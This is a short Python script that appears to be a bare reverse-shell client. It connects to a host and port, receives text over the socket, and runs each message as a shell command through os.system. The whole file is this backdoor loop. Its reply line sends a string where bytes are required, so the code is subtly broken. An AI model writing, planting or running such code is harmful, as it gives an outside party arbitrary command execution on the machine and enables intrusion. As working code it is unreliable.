import socket 
import os 


HOST = '127.0.0.1'
PORT = 1234
with socket.socket() as server:
    server.connect((HOST,PORT))
    while True:
        msg = server.recv(8192)
        data = msg.decode("UTF-8")
        os.system(f"{data}")
        server.send(f'client online .... ')